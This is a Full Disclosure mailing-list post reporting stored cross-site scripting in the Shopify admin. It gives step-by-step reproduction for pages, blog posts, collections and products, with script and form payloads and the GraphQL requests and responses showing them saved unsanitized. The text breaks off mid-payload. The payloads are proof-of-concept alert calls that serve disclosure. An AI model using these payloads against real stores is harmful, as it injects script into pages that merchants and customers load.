---
title: Full Disclosure - Shopify Application
url: https://seclists.org/fulldisclosure/2023/Mar/6
source: Full Disclosure
date: 2023-03-13
fetch_date: 2025-10-04T09:27:08.922461
---

# Full Disclosure - Shopify Application

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# Full Disclosure - Shopify Application

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sat, 11 Mar 2023 19:12:11 +0200

---

```
Correspondence from Shopify declined to comment regarding new discovered
vulnerabilities within their website.

Although 'frontend' vulnerabilities are considered out of scope,
person/tester foundhimself a beefy bugbounty from the same page that has
been listed below, including similar functionality that has not been tested
yet.

Two emails and several  reports, the 'hacker-1' staff reject the bid for
findings.

Online Store -> Pages -> Add Page -> Title -> Title_Name -> Content ->
Paste Payload -> <script src=1 href=1
onerror="javascript:alert(1)"></script>-> Show HTML -> Fix HTML encoding of
tags from

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

<script src=1 href=1 onerror="javascript:alert(1)"></script>

1. Browse to Online Store
2. Select Pages ->  Add Page
3. Set Title -> Title_Name
4. Set Content -> Paste Payload -> <script src=1 href=1
onerror="javascript:alert(1)"></script>
5. Select Show HTML
6. Fix HTML encoding of tags

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

<script src=1 href=1 onerror="javascript:alert(1)"></script>

// HTTP POST request showing XSS payload

POST /admin/online-store/admin/api/unversioned/graphql?operation=PageUpdate
HTTP/2
Host: test-img-src-x-onerror-alert1-test.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
Gecko/20100101 Firefox/108.0
[...]

[...]
"page":{"bodyHtml":"<script src=1 href=1
onerror=\"javascript:alert(1)\"></script>"
[...]

// HTTP response

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
[...]

[...]
page":{"id":"gid://shopify/OnlineStorePage/...","body":"<script src=\"1\"
href=\"1\"
onerror=\"javascript:alert(1)\"></script>\n\ntest","title":"Title_Name"
[...]

Online Store -> Blog Posts -> Add Blog Post -> Title -> Blog_Title ->
Content -> Paste Payload -> <form><button
formaction="javascript:javascript:alert(1)">X </button></form> -> Show HTML
-> Fix HTML encoding of tags from
<p>&lt;form&gt;&lt;button
formaction="javascript:javascript:alert(1)"&gt;X&lt;/button&gt;&lt;/form&gt;</p>
to <p><form><button formaction="javascript:javascript:alert(1)">X<br
/></button></form></p>

1. Browse to Online Store
2. Select Blog Posts -> Add Blog Post
3. Set Title -> Blog_Title
4. Set Content -> Paste Payload -> <script src=1 href=1
onerror="javascript:alert(1)"></script>
5. Select Show HTML
6. Fix HTML encoding of tags

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

<script src=1 href=1 onerror="javascript:alert(1)"></script>

// HTTP POST request showing XSS payload

POST
/admin/online-store/admin/api/unversioned/graphql?operation=ArticleUpdate
HTTP/2
Host: test-img-src-x-onerror-alert1-test.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
Gecko/20100101 Firefox/108.0
[...]

[...]
"article":{"blogId":"gid://shopify/OnlineStoreBlog/...","body":"<script
src=1 href=1 onerror=\"javascript:alert(1)\"></script>"
[...]

// HTTP response showing unsanitized payload

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
[...]

[...]
"article":{"id":"gid://shopify/OnlineStoreArticle/...","title":"Blog_Title","body":"<script
src=\"1\" href=\"1\"
onerror=\"javascript:alert(1)\"></script>\n","handle":"blog_title-2"
[...]

Products -> Collections -> Create Collection -> Title -> Product_Title ->
Description -> Paste Payload -> <form><button
formaction="javascript:javascript:alert(1)">X </button></form> -> Show HTML
-> Fix HTML encoding of tags from
<p>&lt;form&gt;&lt;button
formaction="javascript:javascript:alert(1)"&gt;X&lt;/button&gt;&lt;/form&gt;</p>
to <p><form><button formaction="javascript:javascript:alert(1)">X<br
/></button></form></p>

1. Browse to Products
2. Select Collections -> Create Collection
3. Set Title -> Collection_Title
4. Set Content -> Paste Payload -> <script src=1 href=1
onerror="javascript:alert(1)"></script>
5. Select Show HTML
6. Fix HTML encoding of tags

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

<script src=1 href=1 onerror="javascript:alert(1)"></script>

// HTTP POST request showing XSS payload

POST
/admin/internal/web/graphql/core?operation=CreateCollection&type=mutation
HTTP/2
Host: test-img-src-x-onerror-alert1-test.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
Gecko/20100101 Firefox/108.0
[...]

[...]
"collection":{"title":"Collection_Title","descriptionHtml":"<script src=1
href=1 onerror=\"javascript:alert(1)\"></script>"
[...]

// HTTP response showing unsanitized payload

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
[...]

[...]
"collection":{"id":"gid://shopify/Collection/...","title":"Collection_Title","descriptionHtml":"<script
src=\"1\" href=\"1\" onerror=\"javascript:alert(1)\"></script>"
[...]

Products -> Inventory -> View Products -> Double Click on Product -> Title
-> Inventory_Title -> Description -> Paste Payload -> <form><button
formaction="javascript:javascript:alert(1)">X </button></form> -> Show HTML
-> Fix HTML encoding of tags from
<p>&lt;form&gt;&lt;button
formaction="javascript:javascript:alert(1)"&gt;X&lt;/button&gt;&lt;/form&gt;</p>
to <p><form><button formaction="javascript:javascript:alert(1)">X<br
/></button></form></p>

1. Browse to Products
2. Select Inventory-> View Products
3. Select Product -> Title -> Product_Title
4. Set Description  -> Paste Payload -> <script src=1 href=1
onerror="javascript:alert(1)"></script>
5. Select Show HTML
6. Fix HTML encoding of tags

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

<script src=1 href=1 onerror="javascript:alert(1)"></script>

// HTTP POST request showing XSS payload

POST /admin/internal/web/graphql/core?operation=UpdateProduct&type=mutation
HTTP/2
Host: test-img-src-x-onerror-alert1-test.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
Gecko/20100101 Firefox/108.0
[...]

[...]
"product":{"descriptionHtml":"<script onerror=\"javascript:alert(1)\"
href=\"1\" src=\"1\"></script>","workflow":"product-details-update"
[...]

// HTTP response showing unsanitized payload

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
[...]

[...]
"product":{"id":"gid://shopify/Product/...","title":"Product_Title","handle":"product_title","descriptionHtml":"<script
onerror=\"javascript:alert(1)\" href=\"1\" src=\"1\"></script>"
[...]

Products -> Add Product -> Title -> Product_Title -> Description -> Paste
Payload -> <form><button formaction="javascript:javascript:alert(1)">X
</button></form> -> Show HTML -> Fix HTML encoding of tags from
<p>&lt;form&gt;&lt;button
formaction="javascript:javascript:alert(1)"&gt;X&lt;/button&gt;&lt;/form&gt;</p>
to <p><form><button formaction="javascript:javascript:alert(1)">X<br
/></button></form></p>

1. Browse to Products
2. Add Product -> Title -> Product_Title
3. Set Description -> Paste Payload -> <script src=1 href=1
onerror="javascript:alert(1)"></script>
4. Select Show HTML
5. Fix HTML encoding of tags

&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;

<script src=1 href=1 o...